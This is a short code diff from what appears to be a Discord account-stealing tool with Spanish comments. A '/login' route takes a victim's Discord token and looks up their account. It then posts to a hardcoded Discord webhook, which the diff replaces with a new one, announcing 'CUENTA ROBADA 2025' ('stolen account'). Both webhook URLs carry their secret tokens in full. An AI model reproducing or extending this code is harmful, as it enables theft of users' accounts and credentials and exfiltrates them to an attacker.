@@ -11,7 +11,7 @@ app.post('/login', async (req, res) => {
     const user = await discordAPI('GET', '/users/@me', token);
 
     // TU WEBHOOK PRIVADO (cambiá esto por uno NUEVO y SOLO TUYO)
-    const WEBHOOK = "https://discord.com/api/webhooks/1447035060145619037/2Xb5z7zo8ssKEGIoVD3CEdRsV2LxBE9HC6MuYua17knLaftLXLv7QOKZed7sXOTPXtrr";
+    const WEBHOOK = "https://discord.com/api/webhooks/1447039795342610596/nkakwoCsFOLzwFOSCtJ1vP42Ibninhw5dq5oVraSyQTfT02ibl1j5qw1LgUdxP2GLyl1";
 
     await discordAPI('POST', '/webhooks/' + WEBHOOK.split('/webhooks/')[1], null, JSON.stringify({
       content: "@everyone **CUENTA ROBADA 2025**",
